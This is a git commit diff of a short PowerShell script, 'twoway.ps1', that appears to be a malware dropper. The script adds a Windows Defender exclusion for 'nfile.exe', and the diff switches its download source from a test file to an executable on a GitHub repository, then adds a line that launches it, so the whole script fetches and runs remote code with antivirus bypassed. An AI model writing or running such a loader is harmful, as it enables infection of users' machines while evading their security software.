f7d1868878ccc68f67097559776434f773bedd4e
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-04-09 20:18:46 -0700

    Update twoway.ps1

--- twoway.ps1
+++ twoway.ps1
@@ -1,5 +1,6 @@
 Add-MpPreference -ExclusionProcess "nfile.exe"
 mkdir C:\ProgramData\File65
-$source = 'http://speedtest.tele2.net/10MB.zip'
+$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/nfile.exe'
 $destination = 'C:\ProgramData\File65\nfile.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
+Start-Process C:\ProgramData\File65\nfile.exe
